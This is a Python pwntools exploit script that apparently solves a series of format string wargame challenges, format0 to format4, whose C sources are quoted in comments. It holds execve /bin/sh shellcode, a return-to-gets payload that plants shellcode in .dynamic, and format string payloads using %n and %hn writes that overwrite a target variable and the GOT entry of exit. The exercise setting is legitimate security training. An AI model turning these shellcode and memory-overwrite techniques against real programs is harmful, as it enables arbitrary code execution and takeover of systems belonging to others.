#!/usr/bin/python
#
from pwn import *

shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"

def format0():
	# C source:
	# 		void vuln(char *s);
			
	# 		int main(int argc, char *argv[]) {
	# 			vuln(argv[1]);
	# 		}
	# 		void vuln(char *s) {
	# 			int target = 0; // ebp - 0xc
	# 			char buf[64];  // ebp - 0x4c
	# 			sprintf(buf, s);
	# 			if (target == 0xdeadbeef)
	# 				puts("you have hit the target correctly :)");
	# 		}

	# ebp = buf + 76
	# eip = buf + 80

	def overflow_var():
		
		payload  = "A"*64               # buf
		payload += p32(0xdeadbeef)      # at target

		p = process(["./format0", payload])

		print p.recvline()

		p.close()

	def ropfunc():
		# assuming:
		# 		ASLR off
		# 		NX on
		#
		
		# full the buffer
		payload  = "\x90" * 80		   # to pad

		# write stdin to .dynamic using read@plt
		payload += p32(0xf7e613e0)	   # gets()'s addr in ret
		payload += p32(0x08049550)     # return to shellcode in .dynamic after writing shellcode
		payload += p32(0x08049550)     # .dynamic

		p = process(["./format0", payload])

		p.sendline(shellcode)

		p.interactive()
		
		p.close()

	# overflow_var()
	ropfunc()

# format0()

def format1():
	# C source:
	# 		void vuln(char *s);
			
	# 		int main(int argc, char *argv[]) {
	# 			vuln(argv[1]);
	# 		}
	# 		void vuln(char *s) {
	#           int target; // ds:0x8049638
	#           printf(s);
	# 			if (target != 0)
	# 				puts("you have modified the target :)");
	# 		}

	# ebp = buf + 76

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.word_size = 32

	def overflow_var():
		# ASLR OFF

		payload  = p32(0x8049638) # addr of target
		payload += "BBB"          # to pad
		payload += "%08x"         # to write a number of character
		payload += "%185$n"       # write to target at 186th stack from top of stack
								  # you can use dmesg | tail to find the addr

		p = process(["./format1", payload])

		print "\n%s\n" % ( p.recvline() )

		p.close()

	def ropfunc():
		pass

	overflow_var()
	# ropfunc()

# format1()

def format2():
	# C source:
	# 		void vuln();
	# 		int main(int argc, char *argv[]) {
	# 			vuln();
	# 		}
	# 		void vuln() {
	#			char buf[?];
	#           fgets(buf, 0x200, stdin);
	#			printf(buf);
	#			int target; // @ ds:0x80496e4
	#			if (target == 0x40) {
	#				puts("you have modified the target :)");
	#			}
	#			else {
	#				printf("target is %d :(\n", *target);
	#			}
	# 		}

	# ebp = buf + 0x208

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.word_size = 32

	def overflow_var():
		payload  = p32(0x80496e4) # addr of target
		payload += r"%60x"        # formular : 0x40 - (received) + 8
		payload += "%4$n"         # write at 4th stack

		p = process("./format2")

		p.sendline(payload)

		print "\n%s\n" % p.recvall()

		p.close()

	def ropfunc():
		pass

	overflow_var()
	# ropfunc()

# format2()

def format3():
	# C source:
	# 		void vuln();
	#		void printbuffer(char *buf);
	#
	# 		int main(int argc, char *argv[]) {
	# 			vuln();
	# 		}
	# 		void vuln() {
	#			char buf[?];
	#           fgets(buf, 0x200, stdin);
	#			printbuffer(buf);
	#			int target; // @ ds:0x80496f4
	#			if (target == 0x1025544) {
	#				puts("you have modified the target :)");
	#			}
	#			else {
	#				printf("target is %08x :(\n", *target);
	#			}
	# 		}

	# 		void printbuffer(char *buf) {
	# 			printf(buf);
	# 		}


	# ebp = buf + 0x208

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.word_size = 32


	def overflow_var():
		payload  = p32(0x80496f4) # addr of target
		payload += p32(0x80496f6) # addr of target
		payload += r"%21820x"     # formular : 0x40 - (received) + 8
		payload += "%12$hn"       # write at 0x80496f4
		payload += r"%43966x"
		payload += "%13$hn"       # write at 0x80496f6

		p = process("./format3")

		p.sendline(payload)

		print "\n%s\n" % p.recvall()

		p.close()

	def ropfunc():
		pass

	overflow_var()
	# ropfunc()

# format3()

def format4():
	# C source:
	#		void hello(void);
	#		void vuln(void);
	#
	# 		int main(int argc, char *argv[]) {
	# 			vuln();
	# 		}
	# 		void vuln() {
	#			char buf[?];
	#           fgets(buf, 0x200, stdin);
	#			printf(buf);
	#			exit(1);
	# 		}
	#		void hello(void) {
	#			puts("code execution redirected! you win");
	#			exit(1);
	#		}

	# ebp = buf + 0x208

	context.arch      = 'i386'
	context.os        = 'linux'
	context.endian    = 'little'
	context.word_size = 32


	def overflow_var():
		# py -c 'from pwn import *; ret=0x08049724; print p32(ret) + "%33974x" + "%4$hn"' | ./format4

		# we overwrite the addr of exit in vuln with addr of hello
		# hello addr = 0x80484ba
		payload  = p32(0x08049724) # addr of exit to overwrite in got table, use objdump -R
		payload += r"%33974x"      # formular : 0x84ba - (received) + 8
		payload += "%4$hn"         # write at got table

		p = process("./format4")

		p.sendline(payload)

		print "\n%s\n" % p.recvall()

		p.close()

	def ropfunc():
		pass

	overflow_var()
	# ropfunc()

format4()